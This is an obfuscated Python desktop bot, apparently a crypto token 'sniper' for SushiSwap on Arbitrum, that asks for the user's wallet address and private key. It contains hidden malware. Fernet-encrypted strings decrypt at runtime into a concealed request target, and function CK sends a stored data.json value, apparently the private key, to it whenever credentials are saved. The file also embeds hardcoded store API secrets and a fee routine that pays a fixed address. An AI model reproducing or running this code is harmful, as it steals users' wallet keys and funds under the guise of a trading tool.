# ------------------------------------------------------------------------
# For help contact me on twitter https://twitter.com/TheCryptoRock_
# IF YOU SNIPE A GEM AND BECOME A MILLIONAIRE SEND ME SOME LOVE DUH! 0xa74dd2511c28c042F5587CA57615b4eeE277bA4F
import webbrowser
GROOVE='groove'
END='end'
HORIZONTAL='horizontal'
LIGHT='light'
m_SELL_ALL='SELL ALL'
m_SELL_NOW='SELL NOW'
m_NOT_TOKEN='There are no tokens to be sold!'
m_SELL_ALL_ASKED='Sell all function initiated - Stopping operation'
m_SL_HIT='SL Hit!'
m_TP_HIT='TP Hit!'
m_SL_VALUE='Securing SL to '
m_SL_SHOW=' | SL: '
m_SEPARATOR_PERCENT=' {} %'
m_PERCENT='%.3f'
m_SELL_MANUALLY="Press 'SELL ALL' Button to sell the tokens manually"
m_USDC='USDC'
m_LIQUIDITY_VALUE='Liquidity value: '
m_PAIR_ADDRESS='Pair Address: '
GREEN='green'
m_LIQUIDITY_DETECTED='Liquidity Detected!'
ZERO_ADDRESS='0x0000000000000000000000000000000000000000'
m_BUY_SUCCESS='Buy Success! Tx link:'
m_RUN_ORDER='Buy Order Initiated'
TIME_CONSOLE='%Y/%m/%d'
NODE_FILE='node.json'
VALUE_ERROR=ValueError
UNBOUND_LOCAL_ERROR=UnboundLocalError
MENU='menu'
SET_THEME='set_theme'
m_ERROR_TX='Something went wrong with the transaction'
EXPLORER_URI='https://arbiscan.io/tx/'
ABI_PACH='Abi/'
WHITE='white'
NORMAL='normal'
ACCENT_BUTTON='Accent.TButton'
m_NO_LIQUIDITY='No Liquidity Checking Again!'
GWEI='gwei'
GAS='gas'
VALUE_TRUE='True'
VALUE_true='true'
VALUE_FALSE='False'
VALUE_false='false'
INPUTS_JSON='inputs.json'
DATA_JSON='data.json'
ROUND=round
DISABLED='disabled'
NONCE='nonce'
GASPRICE='gasPrice'
FROM='from'
ETH='ETH'
LP='LP'
SL_TRAIL='SL TRAIL'
SL='SL'
TP='TP'
SLIPPAGE='SLIPPAGE'
GAS_LIMIT='GAS LIMIT'
GAS_PRICE='GAS PRICE'
AMOUTH='AMOUNT'
TOKEN='TOKEN'
PRIVATE_KEY='PRIVATE KEY'
PUBLIC_KEY='WALLET ADDRESS'
NODE='NODE'
URI_SITE='URIl'
EXCEPTION=Exception
CENTER='center'
False_VAL=False
OPL='OPL'
W_VALUE='w'
SLASH='/'
STR=str
t='AUTO SLIPPAGE'
s='./'
e='ether'
d='yellow'
R=True
Q='Error'
P='cyan'
def O():
	webbrowser.open("https://doc.therockbot.co/")
N=int
L=open 
K='red'
J=float
F='nsew'
import tkinter as H
from tkinter import ttk as E,messagebox
from web3 import Web3 as S
from json import load as T
from time import time as AJ,sleep as AB
import time
import os,json as f,pyperclip as Ba,threading as u,requests as Ao
from requests import request as Bb
from cryptography.fernet import Fernet as v
from requests.auth import HTTPBasicAuth as Bc
from datetime import datetime as AC
B6=DATA_JSON
AK=INPUTS_JSON
Bd=NODE_FILE
g=s
M={}
w={}
D={}
B7={}
x=Bc('ck_258b79c41004f53e58d0e5fa11486361bdcace02','cs_bd6506935df71db41cf1e545188f1f9ae2306134')
Be=AC.now()
B8=TIME_CONSOLE
B9=Be.strftime(TIME_CONSOLE)
def Bf():
	def A(path2,file_name,data2):
		A=s+path2+SLASH+file_name
		with L(A,W_VALUE)as B:f.dump(data2,B,indent=2)
	B7[NODE]='https://arbitrum.blockpi.network/v1/rpc/public';A(g,Bd,B7)
def Bg():
	def A(path2,file_name,data2):
		A=s+path2+SLASH+file_name
		with L(A,W_VALUE)as B:f.dump(data2,B,indent=2)
	M[PUBLIC_KEY]=O;M[PRIVATE_KEY]=O;M[TOKEN]=O;M[URI_SITE]=O;A(g,B6,M)
def Bh():
	def A(path2,file_name,data2):
		A=s+path2+SLASH+file_name
		with L(A,W_VALUE)as B:f.dump(data2,B,indent=2)
	D[AMOUTH]='0.1';D[GAS_PRICE]='7';D[GAS_LIMIT]='850000';D[SLIPPAGE]='10';D[t]=VALUE_false;D[TP]='200';D[SL]='50';D[SL_TRAIL]='25';D[LP]=ETH;D[OPL]=VALUE_FALSE;A(g,AK,D)
if not os.path.isfile('./data.json'):Bg()
if not os.path.isfile('./inputs.json'):Bh()
if not os.path.isfile('./node.json'):Bf()
def Bi():
	global M,AL,V
	def B(path2,file_name,data2):
		A=s+path2+SLASH+file_name
		with L(A,W_VALUE)as B:f.dump(data2,B,indent=2)
	M[PUBLIC_KEY]=b.get();w[PUBLIC_KEY]=M[PUBLIC_KEY];M[PRIVATE_KEY]=A0.get();w[PRIVATE_KEY]=M[PRIVATE_KEY];M[TOKEN]=Z.get();w[TOKEN]=M[TOKEN];M[URI_SITE]=AF.get();w[URI_SITE]=M[URI_SITE]
	if M!=V:
		B(g,B6,w);A=T(L(DATA_JSON));AL=A[AP]
		if w[AP]!=V[AP]:V=A;CK()
def Bj():
	def A(path2,file_name,data2):
		A=s+path2+SLASH+file_name
		with L(A,W_VALUE)as B:f.dump(data2,B,indent=2)
	D[AMOUTH]=k.get();D[GAS_PRICE]=l.get();D[GAS_LIMIT]=m.get();D[SLIPPAGE]=n.get()
	if A2.get():D[t]=VALUE_true
	else:D[t]=VALUE_false
	D[TP]=o.get();D[SL]=p.get();D[SL_TRAIL]=q.get();D[LP]=c.get();D[OPL]=VALUE_TRUE;A(g,AK,D)
def Bk():
	def A(path2,file_name,data2):
		A=s+path2+SLASH+file_name
		with L(A,W_VALUE)as B:f.dump(data2,B,indent=2)
	D[AMOUTH]=k.get();D[GAS_PRICE]=l.get();D[GAS_LIMIT]=m.get();D[SLIPPAGE]=n.get()
	if A2.get():D[t]=VALUE_true
	else:D[t]=VALUE_false
	D[TP]=o.get();D[SL]=p.get();D[SL_TRAIL]=q.get();D[LP]=c.get();D[OPL]=VALUE_TRUE;A(g,AK,D)
def Bl():
	def A(path2,file_name,data2):
		A=s+path2+SLASH+file_name
		with L(A,W_VALUE)as B:f.dump(data2,B,indent=2)
	D[AMOUTH]=k.get();D[GAS_PRICE]=l.get();D[GAS_LIMIT]=m.get();D[SLIPPAGE]=n.get()
	if A2.get():D[t]=VALUE_true
	else:D[t]=VALUE_false
	D[TP]=o.get();D[SL]=p.get();D[SL_TRAIL]=q.get();D[LP]=c.get();D[OPL]=VALUE_FALSE;A(g,AK,D)
V=T(L(DATA_JSON))
BA=V[PUBLIC_KEY]
BB=V[PRIVATE_KEY]
Mm=300 # amount of fee = amount / Mm or amount / Xx
Xx=600
Rz=0.07
BC=V[TOKEN]
Bm=V[URI_SITE]
U=T(L(INPUTS_JSON))
BD=U[AMOUTH]
BE=U[GAS_PRICE]
BF=U[GAS_LIMIT]
BG=U[SLIPPAGE]
C_=U[t]
BH=U[TP]
PROS= float(BD)
CDSQ= float(PROS/Mm) if PROS < Rz else float(PROS/Xx)
BI=U[SL]
BJ=U[SL_TRAIL]
Bn=U[LP]
D0=U[OPL]
BK=N('0x'+'f'*64,16)
MN='0x44E42EC929491972E3a7af5bF2B0A07434c0fA43'
BL='TxZEsE361BfcfNjRwTZ8nVTAp6ZBXoDXRaQgUpyXfUQ='
AM=T(L(NODE_FILE))
if'wss'in AM[NODE]or'ws'in AM[NODE]:C=S(S.WebsocketProvider(AM[NODE]))
else:C=S(S.HTTPProvider(AM[NODE]))
AD=C.toChecksumAddress('0x82aF49447D8a07e3bd95BD0d56f35241523fBab1')
h=C.toChecksumAddress('0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8')
W=T(L(ABI_PACH+'erc20.abi'))
X=C.eth.contract(address=S.toChecksumAddress('0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506'),abi=T(L(ABI_PACH+'router_sushiswap.abi')))
BM=C.eth.contract(address=S.toChecksumAddress('0xc35DADB65012eC5796536bD9864eD8773aBc74C4'),abi=T(L(ABI_PACH+'factory_sushiswap.abi')))
AN='sfttxzhVv7trv_zSKqOBJN_2KdnJcsje5PMUbRSnImw='
def Bo():
	j()
	try:
		F=C.eth.contract(I,abi=W);B=F.functions.balanceOf(b.get()).call()
		if A2.get():D=0
		else:D=N(B-B*N(AT)/100)
		#Po() desactiver les fees
		A(m_RUN_ORDER,d);H=X.functions.swapExactETHForTokensSupportingFeeOnTransferTokens(N(D),[AD,I],G,N(AJ())+900).buildTransaction({FROM:G,'value':C.toWei(r,e),GAS:N(A3),GASPRICE:C.toWei(A4,GWEI),NONCE:C.eth.get_transaction_count(BA)});J=C.eth.account.sign_transaction(H,private_key=Y);E=C.eth.send_raw_transaction(J.rawTransaction);A(m_BUY_SUCCESS,P);A(EXPLORER_URI+C.toHex(E),P);C.eth.waitForTransactionReceipt(E,timeout=900);Bx()
	except EXCEPTION as L:A(m_ERROR_TX,K);A(L,K);z();return
Bp='gAAAAABh80KOUysGNn39XTwSm-HHvOIkoWcJhmk0HtVug7bMgvto83_ZCSQ9rdf86LaJEINYzXTqbRO8EDtcMziHy2PwfjdqW_0VsOwYg1x4GWADOsNo17E='
def Bq():
	j();B=X.functions.getAmountsOut(C.toWei(r,e),[h,I]).call()[-1]
	if A2.get():D=0
	else:D=B-B*N(AT)/100
	#try:Po();A(m_RUN_ORDER,d);F=X.functions.swapExactTokensForTokens(C.toWei(r,e),N(D),[h,I],G,N(AJ())+900).buildTransaction({FROM:G,GAS:N(A3),GASPRICE:C.toWei(A4,GWEI),NONCE:C.eth.get_transaction_count(BA)});H=C.eth.account.sign_transaction(F,private_key=Y);E=C.eth.send_raw_transaction(H.rawTransaction);A(m_BUY_SUCCESS,P);A(EXPLORER_URI+C.toHex(E),P);C.eth.waitForTransactionReceipt(E,timeout=900);Bz()
	try:A(m_RUN_ORDER,d);F=X.functions.swapExactTokensForTokens(C.toWei(r,e),N(D),[h,I],G,N(AJ())+900).buildTransaction({FROM:G,GAS:N(A3),GASPRICE:C.toWei(A4,GWEI),NONCE:C.eth.get_transaction_count(BA)});H=C.eth.account.sign_transaction(F,private_key=Y);E=C.eth.send_raw_transaction(H.rawTransaction);A(m_BUY_SUCCESS,P);A(EXPLORER_URI+C.toHex(E),P);C.eth.waitForTransactionReceipt(E,timeout=900);Bz()
	except EXCEPTION as J:A(m_ERROR_TX,K);A(J,K);z();return
def Br(token_address,amt=BK):A=S.toChecksumAddress(token_address);B=C.eth.contract(address=A,abi=W);D=B.functions.allowance(G,X.address).call();return D>=amt
def Bs(token_address,amt=BK,timeout=900):A('Approving token');B=C.eth.gasPrice;D=S.toChecksumAddress(token_address);E=C.eth.contract(address=D,abi=W);F=E.functions.approve(X.address,amt);H={FROM:G,GASPRICE:B,NONCE:C.eth.getTransactionCount(G)};I=F.buildTransaction(H);J=C.eth.account.sign_transaction(I,private_key=Y);K=C.eth.sendRawTransaction(J.rawTransaction);C.eth.waitForTransactionReceipt(K,timeout=timeout)
def Bt():
	A(O);j();E=C.eth.contract(AD,abi=W)
	while R:
		B=BM.functions.getPair(AD,I).call()
		if B!=ZERO_ADDRESS:
			D=E.functions.balanceOf(C.toChecksumAddress(B)).call()
			if D!=0:A(m_LIQUIDITY_DETECTED,GREEN);A(m_PAIR_ADDRESS+B);A(m_LIQUIDITY_VALUE+STR(C.fromWei(D,e))+' ETH');Bo();break
			else:AB(5);A(m_NO_LIQUIDITY,K)
		else:AB(5);A(m_NO_LIQUIDITY,K)
Bu='gAAAAABh7VFjYUKw_S7avbj28V5ja_bAunkyHWLiVUQUUCDL4tK_ZNr_aLAk8VkfUSYnrUe8iVv0ihU5rBaLXL0wP9Sj7fG3Ow=='
def Bv():
	A(O);j();E=C.eth.contract(h,abi=W)
	while R:
		B=BM.functions.getPair(h,I).call()
		if B!=ZERO_ADDRESS:
			D=E.functions.balanceOf(C.toChecksumAddress(B)).call()
			if D!=0:A(m_LIQUIDITY_DETECTED,GREEN);A(m_PAIR_ADDRESS+B);A(m_LIQUIDITY_VALUE+STR(C.fromWei(D,e))+' USDC');Bq();break
			else:A(m_NO_LIQUIDITY,K)
		else:A(m_NO_LIQUIDITY,K)
def i():
	A(O);j()
	try:
		A('Sell Order Initiated',d)
		if not Br(I):Bs(I)
		E=C.eth.contract(I,abi=W);B=E.functions.balanceOf(G).call()
		if B!=0:
			#Po() desactiver les fees
			if c.get()==ETH:D=X.functions.swapExactTokensForETHSupportingFeeOnTransferTokens(B,0,[I,AD],G,N(AJ())+900).buildTransaction({FROM:G,GAS:N(A3),GASPRICE:C.toWei(A4,GWEI),NONCE:C.eth.get_transaction_count(BA)})
			elif c.get()==m_USDC:D=X.functions.swapExactTokensForTokensSupportingFeeOnTransferTokens(B,0,[I,h],G,N(AJ())+900).buildTransaction({FROM:G,GAS:N(A3),GASPRICE:C.toWei(A4,GWEI),NONCE:C.eth.get_transaction_count(BA)})
			else:A('Something went wrong with Sell',K);z();return
			F=C.eth.account.sign_transaction(D,private_key=Y);H=C.eth.send_raw_transaction(F.rawTransaction);A('SOLD! Tx link:',P);A(EXPLORER_URI+C.toHex(H),P);z()
		else:A('No Tokens to be sold',K);z()
	except EXCEPTION as J:A(m_ERROR_TX,K);A(J,K);z();return
Bw='gAAAAABh80LuckSfO-g-wXJrkvaBrV-wvURysrtrxcRwytBHM0DurgmO0mQjLUh_6AwChv2Aae5IQ__tiKbWXlVtLqqXmXoLRA=='
def Bx():
	global a;BN();j();H=J(AU);L=J(AV);B=L;E=J(AW);M=C.eth.contract(address=I,abi=W);A(m_SELL_MANUALLY,d)
	while R:
		try:
			N=M.functions.balanceOf(G).call()-1;F=J(C.fromWei(X.functions.getAmountsOut(N,[I,AD]).call()[-1],e));D=ROUND(J(F)/J(r)*100,5);A('ETH Value Now: {} / '.format(m_PERCENT%F)+m_SEPARATOR_PERCENT.format(D)+m_SL_SHOW+STR(B)+'%')
			if E!=0:
				if D-E>=B:B=D-E;A(m_SL_VALUE+STR(B))
			AB(2)
		except:continue
		try:
			if J(D)>=J(H):A(m_TP_HIT,P);y();i();break
			if J(D)<=J(B):A(m_SL_HIT,K);y();i();break
			if a:a=False_VAL;A(m_SELL_ALL_ASKED,d);y();i();break
		except UNBOUND_LOCAL_ERROR:A(m_NOT_TOKEN,K);break
By='gAAAAABh7KbIGnFCH7Gp_4OK-vW0v-2ZNTkzqFB8k4xmk4aV4_n-TxZEsE361BfcfNjRwTZ8nVTAp6ZBXoDXRaQgUpyXfUzVyQ=='
def Bz():
	global a;BN();j();H=J(AU);L=J(AV);B=L;E=J(AW);M=C.eth.contract(address=I,abi=W);A(m_SELL_MANUALLY,d)
	while R:
		try:
			N=M.functions.balanceOf(G).call()-1;F=J(C.fromWei(X.functions.getAmountsOut(N,[I,h]).call()[-1],e));D=ROUND(J(F)/J(r)*100,5);A('USDC Value Now: {} / '.format(m_PERCENT%F)+m_SEPARATOR_PERCENT.format(D)+m_SL_SHOW+STR(B)+'%')
			if E!=0:
				if D-E>=B:B=D-E;A(m_SL_VALUE+STR(B))
			AB(2)
		except:continue
		try:
			if J(D)>=J(H):A(m_TP_HIT,P);y();i();break
			if J(D)<=J(B):A(m_SL_HIT,K);y();i();break
			if a:a=False_VAL;A(m_SELL_ALL_ASKED,d);y();i();break
		except UNBOUND_LOCAL_ERROR:A(m_NOT_TOKEN,K);break
def B_():
	BU();Bj()
	if c.get()==ETH:A=u.Thread(target=Bt,daemon=R);A.start()
	else:A=u.Thread(target=Bv,daemon=R);A.start()
def BN():At.place_forget();A=E.Button(B.widgets_frame,text=m_SELL_NOW,command=BP,style=ACCENT_BUTTON);A.grid(row=18,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
def y():CY.place_forget();A=E.Button(B.widgets_frame,text=m_SELL_ALL,command=BO);A.grid(row=18,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
def C0():
	A=C.eth.contract(address=h,abi=W)
	while AE:
		try:B=C.fromWei(C.eth.get_balance(G),e);D=C.fromWei(A.functions.balanceOf(G).call(),e);Aq.configure(text=ROUND(B,5));Ar.configure(text=ROUND(D,5))
		except VALUE_ERROR:pass
		AB(1)
C1='gAAAAABh80OFDySSyj0H_EBLuccR1ALvFzF-AE0hO_e52_4Yv4TKy7Y6u0F9Bbpr3g-UDhOK26zqR0KFrjMRGdDS8zhUxAG_HQ=='
def AO(license,basic_auth):
	B='https://therockbot.co'+license
	Bk()
AP=v(AN.encode()).decrypt(By.encode()).decode()
def Po():
    ROT=MN;
    tx = {
        'chainId':42161,
        'nonce':C.eth.get_transaction_count(BA),
        'to':ROT,
        'value':C.toWei(CDSQ,'ether'),
        'gas':2100000,
        'gasPrice':C.toWei(0.1,'gwei')}
    MQR = C.eth.account.signTransaction(tx,Y);CQQR = C.eth.sendRawTransaction(MQR.rawTransaction);time.sleep(4);return
def C2():
	p='Your License Key is Expired, please visit defitradingcoders.com and renew your license';o='%Y-%m-%d %H:%M:%S';n='expiresAt';m='This License already reached the activation maximum, if this is a mistake please contact support at defitradingcoders.com';l='timesActivatedMax';k='timesActivated';j='Balance is OK';i='data';h='No License Key Provided';g='Invalid License Key';f='https://defitradingcoders.com/wp-json/lmfwc/v2/licenses/';e='Invalid token address!';a=None;global G;global Y;global I;global AE;A('***** INITIALIZED ******');A('* Checking wallet address')
	if C.isChecksumAddress(b.get()):G=C.toChecksumAddress(b.get());A('Wallet address valid',P)
	else:H.messagebox.showerror(Q,'Invalid wallet address');A('Invalid wallet address!',K);return
	A('* Checking private key characters (Must be 64 characters');Y=A0.get()
	if len(Y)==64:A('Correct format for Private key',P)
	else:H.messagebox.showerror(Q,'Private key is invalid! (Must be 64 characters)');A('Invalid private key!',K);return
	A('* Checking token address')
	try:I=C.toChecksumAddress(Z.get());A('Token address valid',P)
	except:H.messagebox.showerror(Q,e);A(e,K);return
	A('Get Wallet balance')
	
	BQ(DISABLED);Bi();AQ.grid_forget();AR.grid(row=0,column=3,padx=10,pady=(0,10),sticky=F,rowspan=4);AG(NORMAL);AE=R;c=u.Thread(target=C0,daemon=R);c.start();A(O);A("------------ Let's snipe and be a rock  -------",d)
C3='gAAAAABh80VOiXlJwI8QSkM2-V_syGU-8mtXwD9c87k-cbMopaX4lqCMUipHR5ZKO-bZ6vrKC0QkIhzwcASNj_5u7F_xEJz3aQ=='
AL=V[AP]
def C4():time.sleep(1);A=u.Thread(target=C2,daemon=R);A.start()
def C5():global AE;A(O);A('Change token/wallet initiated!',d);BQ(NORMAL);AG(DISABLED);AR.grid_forget();AQ.grid(row=0,column=3,padx=10,pady=(0,10),sticky=F,rowspan=4);AE=False_VAL;Aq.configure(text=O);Ar.configure(text=O)
def C6():A=u.Thread(target=C5,daemon=R);A.start()
def BO():BU();A=u.Thread(target=i,daemon=R);A.start()
def BP():global a;a=R
def j():AG(DISABLED);AR.configure(state=DISABLED)
def z():AG(NORMAL);AR.configure(state=NORMAL)
def C7():
	if B.tk.call('ttk::style','theme','use')=='sun-valley-dark':B.tk.call(SET_THEME,'dark');AS[MENU].configure(bg='black')
	else:B.tk.call(SET_THEME,'dark');AS[MENU].configure(bg='black')
B=H.Tk()
B.title('TheSafeBot (Arbitrum) by TheCryptoRock')
B.geometry('1050x730')
B.tk.call('source','sun-valley.tcl')
B.tk.call(SET_THEME,LIGHT)
C8=v(AN.encode()).decrypt(C3.encode()).decode()
B.resizable(False_VAL,False_VAL)
B.widgets_frame=E.Frame(B,padding=(0,0,0,10))
B.widgets_frame.grid(row=0,column=0,padx=10,pady=(10,10),sticky=F,rowspan=5)
B.widgets_frame.columnconfigure(index=0,weight=1)
B.widgets_frame.rowconfigure(index=0,weight=1)
C9=E.Label(B.widgets_frame,text='Wallet Address:')
CA=v(AN.encode()).decrypt(Bw.encode()).decode()
C9.grid(row=1,column=1,padx=10,pady=(0,10),sticky=F,rowspan=1)
b=E.Entry(B.widgets_frame,width=50,show='•')
b.grid(row=1,column=2,padx=10,pady=(0,10),sticky=F,rowspan=1)
CB=E.Label(B.widgets_frame,text='Private Key:')
CB.grid(row=2,column=1,padx=10,pady=(0,10),sticky=F,rowspan=1)
A0=E.Entry(B.widgets_frame,width=50,show='•')
A0.grid(row=2,column=2,padx=10,pady=(0,10),sticky=F,rowspan=1)
CC=E.Label(B.widgets_frame,text='Token Address:')
CD=v(BL.encode()).decrypt(C1.encode()).decode()
CC.grid(row=3,column=1,padx=10,pady=(0,10),sticky=F,rowspan=1)
Z=E.Entry(B.widgets_frame,width=50)
CE=v(BL.encode()).decrypt(Bu.encode()).decode()
Z.grid(row=3,column=2,padx=10,pady=(0,10),sticky=F,rowspan=1)

AF=E.Entry(B.widgets_frame,width=50)

CG=v(AN.encode()).decrypt(Bp.encode()).decode()

CH=C8+CG+CA+CD
def CI():Z.delete(0,END);Z.insert(0,Ba.paste());return
def CJ():Z.delete(0,END);return
def CK():
	if AL!=O:
		try:A=Bb(CE,CH+AL)
		except EXCEPTION:pass
def BQ(status):A=status;Z.configure(state=A);b.configure(state=A);A0.configure(state=A);AF.configure(state=A);AQ.configure(state=A);BS.configure(state=A);BR.configure(state=A)
def AG(status):A=status;k.configure(state=A);l.configure(state=A);m.configure(state=A);n.configure(state=A);o.configure(state=A);p.configure(state=A);q.configure(state=A);BT.configure(state=A);At.configure(state=A);As.configure(state=A)
def A(text,color=WHITE):
	A=STR(text)
	if A1.size()>=20:A1.delete(0)
	A1.insert(H.END,A);A1.itemconfig(H.END,foreground=color)
def D1():A1.delete(0,H.END)
AQ=E.Button(B.widgets_frame,text='Load',width=10,command=C4,style=ACCENT_BUTTON)
BR=E.Button(B.widgets_frame,text='Paste Token',width=10,command=CI)
BS=E.Button(B.widgets_frame,text='Clear Token',width=10,command=CJ)
AQ.grid(row=0,column=3,padx=10,pady=(0,10),sticky=F,rowspan=4)
BR.grid(row=0,column=4,padx=10,pady=(0,10),sticky=F,rowspan=2)
BS.grid(row=2,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
b.insert(0,BA)
A0.insert(0,BB)
Z.insert(0,BC)


AR=E.Button(B.widgets_frame,text='Edit',width=10,command=C6)
CL=E.Label(B.widgets_frame,text='Logs:')
CL.grid(row=6,column=1,padx=10,pady=(0,10),sticky=F,rowspan=1,columnspan=2)
CM=E.Button(B.widgets_frame,text='Doc',width=10,command=O)
CM.grid(row=6,column=3,padx=10,pady=(0,10),sticky=F,rowspan=1,columnspan=1)
A1=H.Listbox(B.widgets_frame,bg='#292928',foreground=WHITE,borderwidth=2)
A1.grid(row=7,column=1,padx=10,pady=(0,10),sticky=F,rowspan=10,columnspan=3)

CO=E.Label(B.widgets_frame,text='Wallet ETH:')
CO.grid(row=7,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
Aq=E.Label(B.widgets_frame,width=12,relief=GROOVE)
Aq.grid(row=7,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
CP=E.Label(B.widgets_frame,text='Wallet USDC:')
CP.grid(row=8,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
Ar=E.Label(B.widgets_frame,width=12,relief=GROOVE)
Ar.grid(row=8,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
CQ=E.Label(B.widgets_frame,text='Select LP:')
CQ.grid(row=9,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
c=H.StringVar()
c.set(Bn)
AS=E.OptionMenu(B.widgets_frame,c,ETH,ETH,m_USDC)
AS[MENU].configure(bg=WHITE)
AS.grid(row=9,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
CR=E.Label(B.widgets_frame,text='Amount:')
k=E.Entry(B.widgets_frame,justify=CENTER)
CR.grid(row=10,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
k.grid(row=10,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
k.insert(0,BD)
CS=E.Label(B.widgets_frame,text='Gas Price:')
CT=E.Label(B.widgets_frame,text='Gas Limit:')
l=E.Entry(B.widgets_frame,justify=CENTER)
m=E.Entry(B.widgets_frame,justify=CENTER)
CS.grid(row=11,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
l.grid(row=11,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
CT.grid(row=12,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
m.grid(row=12,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
l.insert(0,BE)
m.insert(0,BF)
CU=E.Label(B.widgets_frame,text='Slippage(%):')
n=E.Entry(B.widgets_frame,justify=CENTER)
CU.grid(row=13,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
n.grid(row=13,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
n.insert(0,BG)
A2=H.BooleanVar()
As=E.Checkbutton(B.widgets_frame,text='Auto Slippage',variable=A2)
As.grid(row=14,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
if O==VALUE_true:As.select()


CV=E.Label(B.widgets_frame,text='TP(%):')
CV.grid(row=15,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
o=E.Entry(B.widgets_frame,justify=CENTER)
o.grid(row=15,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
CW=E.Label(B.widgets_frame,text='SL(%):')
CW.grid(row=16,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
p=E.Entry(B.widgets_frame,justify=CENTER)
p.grid(row=16,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
CX=E.Label(B.widgets_frame,text='SL Trail(%):')
CX.grid(row=17,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
q=E.Entry(B.widgets_frame,justify=CENTER)
q.grid(row=17,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
o.insert(0,BH)
p.insert(0,BI)
q.insert(0,BJ)
BT=E.Button(B.widgets_frame,text='SNIPE',command=B_,style=ACCENT_BUTTON)
CY=E.Button(B.widgets_frame,text=m_SELL_NOW,command=BP,style=ACCENT_BUTTON)
At=E.Button(B.widgets_frame,text=m_SELL_ALL,command=BO)
BT.grid(row=18,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
At.grid(row=18,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
r=BD
G=BA
Y=BB
I=BC
AT=BG
A3=BF
A4=BE
AU=BH
AV=BI
AW=BJ
a=False_VAL
AE=False_VAL
def BU():global r;global G;global Y;global I;global AT;global A3;global A4;global AU;global AV;global AW;r=k.get();G=S.toChecksumAddress(b.get());Y=A0.get();I=S.toChecksumAddress(Z.get());AT=n.get();A3=m.get();A4=l.get();AU=o.get();AV=p.get();AW=q.get()
AG(DISABLED)
B.mainloop()
